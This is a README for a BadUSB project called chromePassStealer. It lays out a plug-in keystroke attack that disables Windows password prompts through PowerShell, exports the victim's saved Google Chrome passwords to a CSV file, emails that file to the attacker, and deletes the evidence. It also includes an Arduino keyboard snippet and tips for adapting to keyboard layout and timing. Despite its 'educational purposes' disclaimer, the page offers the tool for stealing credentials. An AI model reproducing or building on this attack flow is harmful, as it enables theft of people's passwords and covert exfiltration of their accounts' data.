# chromePassStealer ü•∑
This project allows you to steal passwords from **Google Chrome** and get all the data by mail.
# Warning ‚ö†Ô∏è
Everything in this repository is **strictly** for educational purposes. Notice **I am not responsible** for stolen data. **You are responsible** for your actions using developed script for **BadUSB**
# About ‚ÑπÔ∏è
Most people who are not well informed about **computer science** save their **passwords** on **Google Chrome** for convenience. This script uses these **weaknesses** to **steal** all **passwords** saved by **Google Chrome** users. The script makes your **BadUSB** disable **Windows** **passwords** by powershell command line, then it opens **Google Chrome** and download a **.csv** file with all **Chrome passwords** by **Windows shortcuts**. Once this file is downloaded, the **BadUSB** send this file by **mail** from powershell command line. To end up the script delete **.csv** file and close **Google Chrome** and powershell.
### NB n¬∞1
Sometimes, you will see something like this : 
``` 
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(173);
Keyboard.releaseAll(); 
```
This is only to write these characters : "@", "\\". But it depends on the computer's layout, so adapt these characters thanks to this [site](https://www.csee.umbc.edu/portal/help/theory/ascii.txt) and the sequence you actually use to wirte these characters with your keyboard. (or switch the keyboard layout to French)
### NB n¬∞2
When the script is executed the person who plugged **BadUsb** see his computer working alone so this script isn't optimized yet.
### NB n¬∞3
You can customize the **delay** according to the speed in which you plug the **BadUSB**.
